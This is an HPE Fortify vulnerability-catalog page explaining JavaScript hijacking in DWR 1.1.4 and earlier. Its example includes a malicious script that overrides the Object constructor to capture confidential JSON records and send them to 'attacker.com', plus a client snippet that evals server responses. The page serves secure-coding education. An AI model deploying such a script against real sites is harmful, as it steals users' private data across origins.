<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf8">
<title>Software Security | Protect your Software at the Source | HPE Security Fortify</title>
<link rel="stylesheet" href="../css/vcmain.css" type="text/css" media="screen" title="no title" charset="utf-8">
</head>
<script language="javascript">

					if (top.location == self.location)
					{ //if page is not in its frameset
					//top.location.href = "/vulncat/index.html?open=" + window.location.href;
					}

				</script><!-- End of document.header.tile --><body class="level3"><div id="theWrapper">
						<div id="theContentCenter">
							<!-- desc.config.java.javascript_hijacking_vulnerable_framework -->						
							<h1>
							   JavaScript Hijacking: Vulnerable Framework
							</h1>
							<h2>ABSTRACT</h2>
							<p>
							  Applications that leverage versions of the DWR Ajax framework 1.1.4 and earlier are vulnerable to JavaScript hijacking, which allows an unauthorized attacker to read confidential data.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  All released versions of DWR up to and including 1.1.4 are vulnerable to JavaScript hijacking [1]. Until now, the framework has not built any mechanisms for preventing the vulnerability. The good news is that DWR 2.0 is protected against JavaScript hijacking by a mechanism designed to prevent cross-site request forgery. The protection leverages the fact that malicious script cannot read secrets stored in cookies set by other domains, which allows the framework to use a value stored in a cookie as a secret shared between the client and server. DWR 2.0 automatically appends the session cookie to the request in the client and verifies on the server that each request contains the correct value.<br><br>    An application may be vulnerable to JavaScript hijacking if it: 1) Uses JavaScript objects as a data transfer format 2) Handles confidential data. Because JavaScript hijacking vulnerabilities do not occur as a direct result of a coding mistake, the HPE Security Fortify Secure Coding Rulepacks call attention to potential JavaScript hijacking vulnerabilities by identifying code that appears to generate JavaScript in an HTTP response.<br><br>Web browsers enforce the Same Origin Policy in order to protect users from malicious websites. The Same Origin Policy requires that, in order for JavaScript to access the contents of a web page, both the JavaScript and the web page must originate from the same domain. Without the Same Origin Policy, a malicious website could serve up JavaScript that loads sensitive information from other websites using a client's credentials, culls through it, and communicates it back to the attacker. JavaScript hijacking allows an attacker to bypass the Same Origin Policy in the case that a web application uses JavaScript to communicate confidential information. The loophole in the Same Origin Policy is that it allows JavaScript from any website to be included and executed in the context of any other website. Even though a malicious site cannot directly examine any data loaded from a vulnerable site on the client, it can still take advantage of this loophole by setting up an environment that allows it to witness the execution of the JavaScript and any relevant side effects it may have. Since many Web 2.0 applications use JavaScript as a data transport mechanism, they are often vulnerable while traditional web applications are not.<br><br>The most popular format for communicating information in JavaScript is JavaScript Object Notation (JSON). The JSON RFC defines JSON syntax to be a subset of JavaScript object literal syntax. JSON is based on two types of data structures: arrays and objects. Any data transport format where messages can be interpreted as one or more valid JavaScript statements is vulnerable to JavaScript hijacking. JSON makes JavaScript hijacking easier by the fact that a JSON array stands on its own as a valid JavaScript statement. Since arrays are a natural form for communicating lists, they are commonly used wherever an application needs to communicate multiple values. Put another way, a JSON array is directly vulnerable to JavaScript hijacking. A JSON object is only vulnerable if it is wrapped in some other JavaScript construct that stands on its own as a valid JavaScript statement.<br><br><b>Example 1:</b> The following example begins by showing a legitimate JSON interaction between the client and server components of a web application used to manage sales leads. It goes on to show how an attacker can mimic the client and gain access to the confidential data the server returns. Note that this example is written for Mozilla-based browsers. Other mainstream browsers do not allow native constructors to be overridden when an object is created without the use of the new operator.<br><br>The client requests data from a server and evaluates the result as JSON with the following code:<br><br></p>
<pre><br>var object;<br>var req = new XMLHttpRequest();<br>req.open("GET", "/object.json",true);<br>req.onreadystatechange = function () {<br>  if (req.readyState == 4) {<br>    var txt = req.responseText;<br>    object = eval("(" + txt + ")");<br>    req = null;<br>  }<br>};<br>req.send(null);<br></pre>
<br><br>When the code runs, it generates an HTTP request that looks like this:<br><br><pre><br>GET /object.json HTTP/1.1<br>...<br>Host: www.example.com<br>Cookie: JSESSIONID=F2rN6HopNzsfXFjHX1c5Ozxi0J5SQZTr4a5YJaSbAiTnRR<br></pre>
<br><br>(In this HTTP response and the one that follows we have elided HTTP headers that are not directly relevant to this explanation.)<br>The server responds with an array in JSON format:<br><br><pre><br>HTTP/1.1 200 OK<br>Cache-control: private<br>Content-Type: text/javascript; charset=utf-8<br>...<br>[{"fname":"Brian", "lname":"Chess", "phone":"6502135600",<br>  "purchases":60000.00, "email":"brian@fortifysoftware.com" },<br> {"fname":"Katrina", "lname":"O'Neil", "phone":"6502135600",<br>  "purchases":120000.00, "email":"katrina@fortifysoftware.com" },<br> {"fname":"Jacob", "lname":"West", "phone":"6502135600",<br>  "purchases":45000.00, "email":"jacob@fortifysoftware.com" }]<br></pre>
<br><br>In this case, the JSON contains confidential information associated with the current user (a list of sales leads). Other users cannot access this information without knowing the user's session identifier. (In most modern web applications, the session identifier is stored as a cookie.) However, if a victim visits a malicious website, the malicious site can retrieve the information using JavaScript hijacking. If a victim can be tricked into visiting a web page that contains the following malicious code, the victim's lead information will be sent to the attacker's web site.<br><br><pre><br>&lt;script&gt;<br>// override the constructor used to create all objects so<br>// that whenever the "email" field is set, the method<br>// captureObject() will run. Since "email" is the final field,<br>// this will allow us to steal the whole object.<br>function Object() {<br> this.email setter = captureObject;<br>}<br><br>// Send the captured object back to the attacker's Web site<br>function captureObject(x) {<br>  var objString = "";<br>  for (fld in this) {<br>    objString += fld + ": " + this[fld] + ", ";<br>  }<br>  objString += "email: " + x;<br>  var req = new XMLHttpRequest();<br>  req.open("GET", "http://attacker.com?obj=" +<br>           escape(objString),true);<br>  req.send(null);<br>}<br>&lt;/script&gt;<br><br>&lt;!-- Use a script tag to bring in victim's data --&gt;<br>&lt;script src="http://www.example.com/object.json"&gt;&lt;/script&gt;<br></pre>
<br><br>The malicious code uses a script tag to include the JSON object in the current page. The web browser will send up the appropriate session cookie with the request. In other words, this request will be handled just as though it had originated from the legitimate application.<br><br>When the JSON array arrives on the client, it will be evaluated in the context of the malicious page. In order to witness the evaluation of the JSON, the malicious page has redefined the JavaScript function used to create new objects. In this way, the malicious code has inserted a hook that allows it to get access to the creation of each object and transmit the object's contents back to the malicious site. Other attacks might override the default constructor for arrays instead. Applications that are built to be used in a mashup sometimes invoke a callback function at the end of each JavaScript message. The callback function is meant to be defined by another application in the mashup. A callback function makes a JavaScript hijacking attack a trivial affair -- all the attacker has to do is define the function. An application can be mashup-friendly or it can be secure, but it cannot be both. If the user is not logged into the vulnerable site, the attacker can compensate by asking the user to log in and then displaying the legitimate login page for the application.<br><br>This is not a phishing attack -- the attacker does not gain access to the user's credentials -- so anti-phishing countermeasures will not be able to defeat the attack. More complex attacks could make a series of requests to the application by using JavaScript to dynamically generate script tags. This same technique is sometimes used to create application mashups. The only difference is that, in this mashup scenario, one of the applications involved is malicious.
							
							 								<h2>REFERENCES</h2>
																								   <p>[1] B. Chess, Y. O'Neil, and J. West <em>JavaScript Hijacking</em> <br></p>
																									   <p>[2] Standards Mapping - NIST Special Publication 800-53 Revision 4 <em>SC-18 Mobile Code (P2)</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Mobile Top 10 Risks 2014 <em>M4 Unintended Data Leakage</em> <br></p>
																									   <p>[4] Standards Mapping - Web Application Security Consortium 24 + 2 <em>Information Leakage</em> <br></p>
																									   <p>[5] Standards Mapping - Web Application Security Consortium Version 2.00 <em>Information Leakage (WASC-13)</em> <br></p>
																														<div id="theFooter">
							<p></p>
							<br><center>
                                                        © Copyright 2008 - 2015 Hewlett Packard Enterprise Development Company, L.P.
							<br>
							(Generated from version 2015.4.0.0008 of the HPE Security Fortify Secure Coding Rulepacks)
							<br>
							desc.config.java.javascript_hijacking_vulnerable_framework
							</center>
							<p></p>
						</div>
</div>
</div></body>
</html>
 
